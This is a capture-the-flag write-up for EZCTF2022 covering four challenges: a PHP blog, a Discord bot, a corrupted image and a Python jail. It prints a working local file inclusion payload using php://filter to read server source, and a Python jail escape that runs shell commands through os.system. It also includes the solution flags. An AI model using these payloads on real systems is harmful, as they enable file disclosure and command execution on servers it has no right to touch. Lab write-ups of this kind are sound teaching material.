
# [EZCTF2022](https://ez.ctf.cafe/)

<img align="left" width="200" height="175" src="https://user-images.githubusercontent.com/68913871/173004513-c4453a87-5b7b-4160-b50d-cf2c1520beae.png">

&nbsp; 24 hours Jeopardy-Style  
&nbsp; Sat, 07 May 2022, 00:00 SGT — Sun, 08 May 2022, 00:00 SGT  

&nbsp; **Team Name:** *Rookie441*  
&nbsp; **Team Member(s):**  
&nbsp; 1. *Lee Wen Bin Andre*  

<br/><br>

| Challenge | Category |
| --- | --- |
| [I made a blog](#i-made-a-blog)	| Web |
| [Discord Bot Workaround](#discord-bot-workaround)	| Misc |
| [Grandma](#grandma) | Misc |
| [Save Peach](#save-peach) | Pwn |

## I made a blog

![image](https://user-images.githubusercontent.com/68913871/173005222-676f7ce6-2521-4567-aa05-2f46d2c53b71.png)

> Navigate to the blog tab

![image](https://user-images.githubusercontent.com/68913871/173005263-277d75f6-52d1-4a72-817b-b6beab4cc89b.png)

> Upon clicking `Read More` on one of the blogs, we are redirected to `http://ez.ctf.cafe:9999/blog-posts.php?file=blog2.html`. We can see that the site uses php. In addition, the url parameter `file` may be vulnerable which points us to [Local File Inclusion attack using PHP wrapper](https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225). The payload is `page=php://filter/convert.base64-encode/resource=index`. We can replace `page` with `file`. However, we still need to know what the name of our resource file is.

> One of the first things to do is to navigate to `/robots.txt` which tells search engine crawlers which URLs the crawler can access on the site. We get the following:

```
User-agent: *
Disallow: /flag.php

How do you filter your coffee?
```

> Now that we know the file name of our flag, we can proceed with our payload `http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php`

```
PD9waHAKCWVjaG8gJ0hvdyBkbyB5b3UgZmlsdGVyIHlvdXIgY29mZmVlPyc7ICAgIAoJLy8gRVotQ1RGe0xGSV8xU18zWn0KPz4K
```

> After decoding the base64 string using [CyberChef](https://gchq.github.io/CyberChef/), we get our flag.

```
<?php
	echo 'How do you filter your coffee?';    
	// EZ-CTF{LFI_1S_3Z}
?>
```

`EZ-CTF{LFI_1S_3Z}`

## Discord Bot Workaround

![image](https://user-images.githubusercontent.com/68913871/173006871-156a7cfd-db0d-4d20-a149-0bfe73aeadd2.png)

> There is a discord bot in the EZCTF Server with a `?flag` command. However, if we were to run it, we get an error stating that we are not admin.

![image](https://user-images.githubusercontent.com/68913871/173007367-f8c6460a-4f98-4a21-905f-102125a5e2a3.png)

> To solve this challenge, we need to create our own discord server such that we are the admin, and then invite the bot to our server to run the flag command. From this [discord documentation](https://discord.com/developers/docs/topics/oauth2#bot-authorization-flow-url-example), we can see that we can simply invite any public bot with this url `https://discordapp.com/oauth2/authorize?client_id=<Bot_Client_ID>&scope=bot&permissions=0`

> To get the `Bot_Client_ID`, we need to inspect elements and find the link to the bot's avatar. `https://cdn.discordapp.com/avatars/971520199515836456/4b90c1efeb3611730218f91cd4a3ce50.webp?size=40`

> From this, we can see that our `Bot_Client_ID` is `971520199515836456`. Hence, we can then visit `https://discordapp.com/oauth2/authorize?client_id=971520199515836456&scope=bot&permissions=0` to invite the bot to our personal server.

![image](https://user-images.githubusercontent.com/68913871/173008216-65779a56-4949-4664-a8e6-c65369b23eeb.png)

![image](https://user-images.githubusercontent.com/68913871/173008225-a1a04c2a-8378-450a-9d27-8ad70b5a1de8.png)

`EZ-CTF{D1SC0RD_1S_L1T}`

## Grandma

![image](https://user-images.githubusercontent.com/68913871/173008411-a3765989-2e3a-49e4-92b8-b385c09e31c8.png)
[Grandma.jpg](https://user-images.githubusercontent.com/68913871/173009198-93353b24-7083-4f4f-9287-d59e960d48aa.jpg)

> The image file cannot be open hence it must have been corrupted. We can view the contents in a hexeditor to confirm.

![image](https://user-images.githubusercontent.com/68913871/173009447-66adb0d5-3172-4c5a-af8c-bfb1c972c177.png)

> Interesting to note is that the decoded text seems to be a combination of offsets, hex values and decoded texts.

> We can copy paste everything from the hexedtor and paste in in CyberChef's `From hex`

![image](https://user-images.githubusercontent.com/68913871/173011253-76a2300e-7789-46e2-b36a-37b6d99c5b49.png)

> However, we can see 3 hex values are replaced with `XX`. Looking at `IHDR`, we can tell that it should have a PNG header. From wiki's [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), we can see that the header should start with `89 50 4E 47 0D 0A 1A 0A`

> After substituting `XX` with the correct values, we can then use CyberChef's `From Hexdump` and then save the output as a png file

![image](https://user-images.githubusercontent.com/68913871/173012003-8774d139-d402-4e86-88f7-4f78dcbecfc0.png)

![image](https://user-images.githubusercontent.com/68913871/173012095-bb73c0f9-3ebe-4c70-aa5f-cfac8423b7b8.png)

`EZ-CTF{W3LL_AINT_7H47COOL}`

## Save Peach

![image](https://user-images.githubusercontent.com/68913871/173012357-4db7af9e-80f9-48bf-af10-1862bfab2931.png)

> The description hints that this is a [PythonJail](https://anee.me/escaping-python-jails-849c65cf306e) challenge. The link pretty much explained everything we need to know, so we can proceed with our payload `print(__builtins__.__dict__['__import__']('os').__dict__['system']('cat flag.txt'))`. Thankfully, there is no blacklist, so we can easily get our flag.

![image](https://user-images.githubusercontent.com/68913871/173012422-325c1f30-4374-4738-982f-37f69516634b.png)

`EZ-CTF{P34CH_H4S_B33N_S4V3D}`

## [Go to Top](#ezctf2022)
